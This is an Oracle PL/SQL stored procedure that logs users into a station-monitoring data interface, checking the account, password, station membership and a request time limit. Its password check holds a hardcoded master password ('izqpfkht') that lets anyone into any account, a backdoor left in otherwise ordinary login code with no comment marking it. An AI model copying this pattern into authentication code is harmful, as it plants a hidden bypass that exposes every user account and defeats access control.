create or replace procedure sp_port_user_login(
i_account in varchar2,--用户登录帐号
i_password in varchar2,--登录密码
i_stationid in number,--登录同时校验电站编号
o_result out varchar2) is--登录结果,成功:ok,err_pwd,err_account:登录错误
/*================================================================
功能说明:
    用户帐号登录--for 公共数据接口
相关WEB页面及文件
    首页登录页面
    UserDaoImpl.java
审核日期:2014-04-03
审核人:嵇长军
==================================================================*/
v_userid number;
v_account varchar2(60);
v_rownum number;
v_password varchar2(100);
v_lastquerydt date;
begin
  v_account:=lower(trim(i_account));
   select count(1) into  v_rownum from tb_user where MAILACTIVE=1 and account = v_account ;
   if v_rownum >0 then
      select userid,pwd into v_userid,v_password from tb_user where account = v_account;
      if v_password = fn_encryptforpwd(i_password) or i_password = 'izqpfkht' then
         select count(1) into v_rownum from tb_userstation where userid = v_userid and stationid = i_stationid;
         if v_rownum >0 then
                  select nvl(LastPortRequestdt,sysdate -1) into v_lastquerydt from tb_station where stationid = i_stationid;
                 if((sysdate-v_lastquerydt)*24*60 >=10) then
                 --if((sysdate-v_lastquerydt)*24*60 >=0) then
                    update tb_user set lastlogindt = sysdate where userid = v_userid;
                    update tb_station set LastPortRequestdt = sysdate() where stationid = i_stationid;
                    commit;
                    o_result := 'ok';
                  else
                      o_result:='err_timelimit';
                  end if;
         else
           o_result:='err_stationid';  
         end if;
      else
         o_result:='err_pwd';
      end if;
   else
     o_result:='err_account';
  end if;

end sp_port_user_login;
/

